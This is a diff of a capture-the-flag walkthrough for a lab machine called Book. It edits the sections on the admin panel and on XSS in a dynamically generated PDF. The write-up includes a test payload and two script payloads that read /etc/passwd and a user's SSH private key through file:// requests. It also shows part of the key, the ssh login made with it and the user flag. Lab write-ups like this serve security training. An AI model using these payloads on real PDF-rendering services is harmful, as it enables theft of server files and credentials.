@@ -201,31 +201,47 @@ I was pleasantly surprised to see an `/admin/index.php` page listed.
 
 At first I tried to see if the "Forgot your password?" link would do anything, but it wasn't linked to anything and doesn't work.  I tried using my new admin credentials I had created and logged in.  
 
+## Initial Foothold
+
+### Road to User
+
 ![](../.gitbook/assets/15-real-adminpage.png)
 
 Thankfully, the Administrator panel had some new options.  
 
-## Initial Foothold
+![](../.gitbook/assets/screenshot_2020-06-07_12-05-10.png)
 
-## Road to User
 
-You can see that the author and book name is reflecting in the pdf
 
-[https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html](https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html)
+![](../.gitbook/assets/screenshot_2020-07-11_10-13-35.png)
 
-## Testing Code Execution with XSS
+You can see that the author and book name is reflecting in the pdf, in what looks like a standard html table.  This seems like it could be the code reflection vulnerability I was looking for.  Hopefully there was a way to get it to execute as well.  I also downloaded the users collection to see if there was anything useful, but just got a good laugh instead.
 
-`<img src=x onerror=document.write('test')>`
+![](../.gitbook/assets/17-user-brute.png)
 
-"test" was written to the pdf!
+You can see the attempts by other users at brute forcing the login page \(looks like burp intruder\), and also at the bottom you can see what appears to be an attempt at SQL injection.  This document had hundreds of lines of similar attacks.  You can see one of my `test` accounts up at the top \(_and that  `peter` guy seems like a very friendly fellow!_\). Sadly no one but me had sent any messages to the admin in the hopes they would get XSS execution on the Feedback page.
 
-## Local File Inclusion \(LFI\) through XSS Cross Site Scripting
+### Testing Code Execution with XSS
+
+Since I had seen the name and title I had assigned my book submission in the pdf in what looked like a rendered html table format, I wanted to see if it was possible to do cross site scripting through this route.  Luckily for me, there was already a write-up on exactly this scenario at [https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html](https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html).  First I tried again sending just the word 'test' in each field to validate what I found.
+
+![](../.gitbook/assets/19-test-submission.png)
+
+I captured this POST in Burp and once again sent it to Repeater.  Sending this resulted in the same pdf collection as before, with a random number next to the the word 'test'.  Next, I changed the Book Title field to contain a simple XSS attack with `<img src=x onerror=document.write('test')>`. 
+
+![](../.gitbook/assets/20-test.png)
+
+This time only the word 'test' was written to the pdf!  The XSS vulnerability was confirmed.
+
+### Local File Inclusion \(LFI\) through XSS - Cross Site Scripting
 
 the pdf that is uploaded to the site can be downloaded through the admin portal, but the pdf output the admin portal collections page makes is dynamically projected html. This can be exploited to xss ^ with javascript. Code execution! lets try to get `/etc/passwd` now. I used burp to make sending the request easier each time.
 
 ```text
 <script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script>
 ```
+
+![](../.gitbook/assets/23-etc-passwd.png)
 
 LFI vulnerability confirmed. Only reader and root can login. user 'reader' was identified through getting the /etc/passwd file, then need to see if he has ssh key file since port 22 is open, and I have not found any passwords anywhere
 
@@ -234,6 +250,10 @@ LFI vulnerability confirmed. Only reader and root can login. user 'reader' was i
 ```text
 <script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///home/reader/.ssh/id_rsa");x.send();</script>
 ```
+
+
+
+![](../.gitbook/assets/screenshot_2020-07-11_10-14-44.png)
 
 had to open pdf in firefox then ctrl-a, ctrl-c, otherwise text is truncated in default pdf reader
 
@@ -267,16 +287,11 @@ nkeaf9obYKsrORVuKKVNFzrWeXcVx+oG3NisSABIprhDfKUSbHzLIR4=
 -----END RSA PRIVATE KEY-----
 ```
 
-### User.txt
-
 remember to chmod 600 id\_rsa before use
 
 ```text
 zweilos@kalimaa:~/htb/book$ ssh -i id_rsa reader@10.10.10.176
-The authenticity of host '10.10.10.176 (10.10.10.176)' can't be established.                           
-ECDSA key fingerprint is SHA256:QRw8pCXg7E8d9sWI+0Z9nZxClJiq9/eAeT/9wUfoQQk.                           
-Are you sure you want to continue connecting (yes/no/[fingerprint])? yes                               
-Warning: Permanently added '10.10.10.176' (ECDSA) to the list of known hosts.                          
+                    
 Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 5.4.1-050401-generic x86_64)
 
  * Documentation:  https://help.ubuntu.com
@@ -304,9 +319,16 @@ Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your 
 
 
 Last login: Sun Jun  7 17:00:50 2020 from 10.10.14.147
+reader@book:~$
+```
+
+### User.txt
+
+
+
+```text
 reader@book:~$ cat user.txt 
 51c1d4b5197fa30e3e5d37f8778f95bc
-reader@book:~$
 ```
 
 ## Path to Power \(Gaining Administrator Access\)
